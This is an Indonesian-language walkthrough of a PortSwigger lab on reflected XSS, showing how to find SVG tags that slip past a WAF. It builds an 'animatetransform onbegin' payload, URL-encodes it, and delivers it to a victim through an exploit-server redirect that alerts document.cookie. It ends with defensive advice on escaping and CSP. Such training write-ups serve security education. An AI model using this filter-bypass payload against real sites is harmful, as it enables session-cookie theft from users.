
# Reflected XSS with some SVG markup allowed

# Reflected XSS dengan Beberapa Markup SVG Diperbolehkan

Lab ini memiliki kerentanan **Reflected Cross-Site Scripting (XSS)** sederhana. Situs ini memblokir tag HTML umum tetapi melewatkan beberapa tag dan atribut SVG. Untuk menyelesaikan lab ini, Anda perlu melakukan serangan XSS yang memanggil fungsi `alert()` secara otomatis.

---------------------------------------------

## Referensi:

- [PortSwigger: Contexts in XSS](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Memahami Kerentanan Reflected XSS

**Reflected XSS** terjadi ketika aplikasi web menerima data dari pengguna dan langsung mencerminkannya kembali ke respons HTTP tanpa validasi atau sanitasi yang memadai. Dalam lab ini, fungsi pencarian memantulkan input pengguna di dalam elemen `<h1>` HTML.

**Contoh Refleksi:**

![H1 Reflected](images/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/1.png)

### 2. Menguji Tag dan Atribut yang Diperbolehkan

Situs ini memblokir semua tag HTML umum tetapi masih memperbolehkan beberapa tag dan atribut SVG. Kita perlu mengidentifikasi tag dan atribut apa saja yang diizinkan untuk merancang payload XSS yang efektif.

#### a. Menguji Semua Tag yang Mungkin

Pertama, kita akan menguji berbagai tag untuk melihat mana yang diizinkan oleh WAF (Web Application Firewall).

**Payload Awal:**

```html
<tag attrib=alert(1)>text</tag>
```

**Pengamatan:**

![Testing Attributes](images/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/2.png)

**Hasil:**

- Semua atribut tampaknya valid.

Kemudian, kita menguji berbagai tag yang mungkin diperbolehkan oleh WAF.

![Testing Tags](images/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/3.png)

**Tag yang Diperbolehkan:**

- `animatetransform`
- `image`
- `title`
- `svg`

### 3. Menguji Atribut yang Diperbolehkan

Setelah mengetahui tag yang diizinkan, langkah selanjutnya adalah menguji atribut yang bisa digunakan untuk menjalankan JavaScript. Dari pengujian, atribut yang diizinkan adalah:

- `onbegin`

### 4. Menyusun Payload XSS dengan SVG

Dengan informasi tentang tag dan atribut yang diizinkan, kita dapat menyusun payload XSS yang efektif. Berikut adalah contoh payload yang berhasil dijalankan:

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform></svg>
```

**Pengamatan:**

![Successful Payload](images/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/6.png)

### 5. Menyusun Query dan Memahami URL Encoding

Untuk menyuntikkan payload ke dalam fungsi pencarian, kita perlu memahami bagaimana payload tersebut di-encode dalam URL. Berikut adalah langkah-langkahnya:

#### a. Menyusun Payload Akhir

**Payload Akhir:**

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform></svg>
```

**URL Encoded Payload:**

```
%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%20attributeName%3Dtransform%3E%3C/svg%3E
```

**URL Lengkap:**

```
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%20attributeName%3Dtransform%3E%3C/svg%3E
```

#### b. Menyisipkan Payload ke dalam Iframe

Untuk menjalankan payload secara otomatis tanpa interaksi pengguna, kita akan menyisipkannya ke dalam elemen `<iframe>`.

**Kode Iframe:**

```html
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%20attributeName%3Dtransform%3E%3C/svg%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```

### 6. Menyusun dan Mengirimkan Payload melalui Exploit Server

Langkah berikutnya adalah mengirimkan payload melalui Exploit Server agar korban dapat menjalankan payload tanpa menyadarinya.

#### a. Menyusun Kode Exploit

Ganti `YOUR-LAB-ID` dengan ID lab Anda dalam kode berikut:

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28document.cookie%29%20attributeName%3Dtransform%3E%3C/svg%3E';
</script>
```

**Penjelasan:**

- **Tag Kustom `<svg>`:**
  - Tag SVG diperbolehkan dan dapat digunakan untuk menyuntikkan event handler.
  
- **Atribut `onbegin`:**
  - Atribut ini diizinkan dan digunakan untuk memicu fungsi `alert()` ketika animasi dimulai.
  
- **URL Encoding:**
  - Karakter khusus dalam HTML di-encode untuk memastikan payload diterima dengan benar oleh fungsi pencarian.

#### b. Mengirimkan Exploit ke Korban

1. **Buka Exploit Server:**
   - Masuk ke Exploit Server di platform lab Anda.
   
2. **Paste Kode Exploit:**
   - Tempelkan kode yang telah disusun, mengganti `YOUR-LAB-ID` dengan ID lab Anda.
   
   **Contoh Payload Akhir:**

   ```html
   <script>
   location = 'https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28document.cookie%29%20attributeName%3Dtransform%3E%3C/svg%3E';
   </script>
   ```
   
3. **Klik "Store" dan "Deliver exploit to victim":**
   - Klik tombol **"Store"** untuk menyimpan exploit.
   - Klik tombol **"Deliver exploit to victim"** untuk menyampaikan exploit kepada korban.

### 7. Memverifikasi Eksekusi Payload

Setelah mengirimkan exploit, verifikasi apakah payload telah dieksekusi dengan sukses.

#### a. Memeriksa Dialog Alert

Jika payload berhasil, dialog alert akan muncul secara otomatis menampilkan `document.cookie`.

#### b. Melihat Log Aktivitas di Konsol Browser

Buka konsol pengembang di browser dan periksa apakah ada pesan atau aktivitas yang terkait dengan pemanggilan fungsi `alert(document.cookie)`.

![Payload Execution](images/Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/6.png)

## Penjelasan

**Reflected Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana skrip berbahaya disuntikkan ke dalam respons HTTP langsung melalui input pengguna. Dalam kasus ini, skrip dijalankan di dalam konteks HTML di dalam elemen `<h1>`, dengan sebagian besar tag dan atribut yang umum diblokir oleh WAF, kecuali beberapa tag SVG dan atribut tertentu.

### Mengatasi Pembatasan WAF dengan SVG

WAF sering kali memblokir tag dan atribut yang umum digunakan untuk serangan XSS, seperti `<script>`, `onerror`, dan lainnya. Namun, beberapa tag SVG dan atribut khusus masih diperbolehkan, seperti `onbegin` pada tag `<animatetransform>`. Dengan memanfaatkan tag dan atribut yang diperbolehkan ini, kita dapat menyuntikkan skrip berbahaya tanpa terdeteksi oleh WAF.

### Analisis Payload

**Payload:**

```html
<svg><animatetransform onbegin=alert(document.cookie) attributeName=transform></svg>
```

- **Tag `<svg>`:**
  - Tag SVG diperbolehkan dan digunakan sebagai wadah untuk menyuntikkan animasi.
  
- **Tag `<animatetransform>`:**
  - Tag animasi SVG yang digunakan untuk mengubah transformasi elemen SVG.
  
- **Atribut `onbegin`:**
  - Event handler yang dijalankan ketika animasi dimulai. Dalam payload ini, `onbegin` memanggil fungsi `alert(document.cookie)`.

- **Atribut `attributeName=transform`:**
  - Mendefinisikan atribut yang akan diubah oleh animasi, dalam hal ini `transform`.

**Proses Eksekusi:**

1. **Suntikkan Payload:**
   - Payload disisipkan melalui fungsi pencarian yang merefleksikan input di dalam elemen `<h1>`.
   
2. **Injeksi dalam Iframe:**
   - Payload dimasukkan ke dalam elemen `<iframe>` sehingga dieksekusi saat halaman dimuat.
   
3. **Pemicu Event `onbegin`:**
   - Saat halaman SVG dimuat, animasi dimulai, memicu event `onbegin` dan menjalankan fungsi `alert(document.cookie)` secara otomatis tanpa interaksi pengguna.

### Pentingnya Validasi dan Sanitasi Input

Kerentanan XSS memungkinkan penyerang untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi, memungkinkan mereka melakukan tindakan seperti mencuri cookie, mengubah konten halaman, atau bahkan mengambil alih akun pengguna. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.

**Praktik Terbaik:**

- **Escape Output:**
  - Gunakan teknik escaping yang sesuai berdasarkan konteks output (HTML, JavaScript, CSS, dll.).
  
- **Gunakan Content Security Policy (CSP):**
  - Terapkan CSP untuk membatasi sumber skrip yang diizinkan.
  
- **Validasi Input:**
  - Batasi jenis dan format input yang diterima oleh aplikasi.
  
- **Sanitasi Input:**
  - Bersihkan input dari karakter dan pola yang dapat digunakan untuk serangan XSS.

## Kesimpulan

Eksploitasi **Reflected XSS** dengan memanfaatkan markup SVG yang diperbolehkan memerlukan pemahaman mendalam tentang tag dan atribut yang dapat digunakan untuk menjalankan skrip berbahaya. Dengan memanfaatkan tag `<svg>` dan atribut `onbegin` pada tag `<animatetransform>`, penyerang dapat menyuntikkan dan menjalankan fungsi `alert(document.cookie)` tanpa terdeteksi oleh WAF yang memblokir tag dan atribut HTML umum. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti validasi dan sanitasi input, serta penggunaan Content Security Policy (CSP), untuk mencegah kerentanan XSS ini.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [MDN Web Docs: SVG and JavaScript](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Scripting)
